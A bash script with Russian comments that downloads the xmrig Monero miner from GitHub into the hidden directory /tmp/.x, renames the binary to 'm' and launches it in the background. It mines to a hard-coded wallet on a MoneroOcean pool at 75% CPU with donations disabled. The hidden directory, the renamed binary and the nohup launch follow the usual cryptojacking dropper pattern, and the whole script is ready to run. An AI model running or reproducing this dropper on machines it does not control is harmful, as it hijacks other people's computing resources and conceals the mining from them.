#!/bin/bash

# Функция для логирования
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Функция для проверки успешности выполнения команды
check_status() {
    if [ $? -eq 0 ]; then
        log_message "✓ $1"
        return 0
    else
        log_message "✗ $1"
        return 1
    fi
}

# Основной скрипт с логированием
log_message "=== Начало выполнения скрипта ==="

# 1. Переход в /tmp
cd /tmp
check_status "Переход в /tmp"

# 2. Очистка и создание рабочей директории
rm -rf .x 2>/dev/null
mkdir -p /tmp/.x
check_status "Создание рабочей директории /tmp/.x"

# 3. Переход в рабочую директорию
cd /tmp/.x
check_status "Переход в /tmp/.x"

# 4. Загрузка xmrig
log_message "Начало загрузки xmrig..."
wget -q https://github.com/moneroocean/xmrig/releases/download/v6.25.0-mo1/xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Загрузка xmrig"

# 5. Распаковка архива
log_message "Распаковка архива..."
tar -xzf xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Распаковка архива"

# 6. Установка прав выполнения
chmod +x xmrig
check_status "Установка прав выполнения для xmrig"

# 7. Переименование файла
mv xmrig m
check_status "Переименование xmrig в m"

# 8. Проверка наличия файла
if [ -f "./m" ]; then
    log_message "✓ Файл ./m существует и готов к запуску"
else
    log_message "✗ Файл ./m не найден"
    exit 1
fi

# 9. Запуск майнера с подробным логированием
log_message "Запуск майнера с параметрами:"
log_message "  Пул: gulf.moneroocean.stream:10128"
log_message "  Кошелек: 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
log_message "  Имя воркера: worker7"
log_message "  Потоки: 75% CPU"
log_message "  Уровень доната: 0%"

# Запуск в фоновом режиме с сохранением PID
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p worker7 --cpu-max-threads-hint=75 -B --donate-level=0 >xmrig_output.log 2>&1 &
PID=$!

# Проверка запуска
sleep 2
if ps -p $PID > /dev/null; then
    log_message "✓ Майнер успешно запущен (PID: $PID)"
    log_message "  Логи майнера пишутся в файл: /tmp/.x/xmrig_output.log"
else
    log_message "✗ Не удалось запустить майнер"
    exit 1
fi

log_message "=== Скрипт успешно завершен ==="
log_message "Проверьте работу майнера командой: ps aux | grep m"
log_message "Посмотрите логи командой: tail -f /tmp/.x/xmrig_output.log"
